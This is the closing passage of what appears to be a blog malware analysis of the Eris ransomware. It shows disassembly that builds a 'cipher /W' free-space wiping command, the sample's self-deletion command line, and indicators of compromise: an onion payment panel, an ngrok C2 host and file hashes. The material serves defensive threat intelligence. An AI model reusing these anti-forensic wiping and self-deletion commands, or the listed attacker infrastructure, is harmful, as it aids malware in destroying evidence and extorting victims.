<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feac8</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feace</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fead5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feadc</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x6775d1</span>] <span style="color:#75715e">; &#34;/C cipher /W:%s:&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005feae2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feae5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0x10</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaed</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">var_190h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaf4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feaf8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb00</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb08</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb0d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb11</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb15</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x674d1b</span>] <span style="color:#75715e">; &#34;cmd.exe&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005feb1b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb1e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">7</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb26</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb2a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feb2e</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Execute</span>
</code></pre></div><h3 id="self-removal">Self-removal</h3>
<p>Finally the malware spawns a new process and exits. The spawned process first
pings localhost to create a delay before it deletes the malware&rsquo;s binary file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">%WINDIR%\system32\cmd.exe /C ping 127.0.0.1 -n 3 &gt; NUL &amp;&amp; del /Q /F &#34;%ERIS_FILE%&#34;
</code></pre></div><h1 id="iocs">IOCs</h1>
<h2 id="pay-panel">Pay panel</h2>
<ul>
<li>epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion</li>
</ul>
<h2 id="c2">C2</h2>
<ul>
<li>d9d120a3.ngrok.io</li>
</ul>
<h2 id="hashes">Hashes</h2>
<ul>
<li>2c7f9fbfd5421406bc88b62a70a570eada14d4a561689125dc8f3ef30e3afc91</li>
<li>33f54f227c26c5abdbe5e0f994082d5b89e1df145deef703948aeb268637d9ba</li>
<li>35fb8b1f9966d7d371cb4d513e3d63655c2357be8ef156850fe8927b13007c9e</li>
<li>48da454be70e5f12c359965cfb55cbe5f272ddc378ae9f08876faf1b510c21b6</li>
<li>99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692</li>
<li>d0d6fdd6ce8eccf722c8ee72485ae96c2fe0e2fe9e451c94454f1e8be9d9283b</li>
<li>dcdf47ddca1c5f4f9bdd8528bc3e22031fbfd326ad0b4abc11e153bbd79363ec</li>
</ul>
<p>Download <a href="https://joakimkennedy.keybase.pub/intel/eris-v2-stix.json">STIX 2</a> bundle or <a href="https://joakimkennedy.keybase.pub/intel/eris-v2-misp.json">MISP</a> package <a href="https://intel.lekstu.ga">here</a>.</p>

      </div>

      <footer>
        


        
      </footer>
    </article>

    
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
      <p>All rights reserved</p>
    
     © 2021
    
    
  </section>
</footer>

    </main>

    

  </body>

</html>
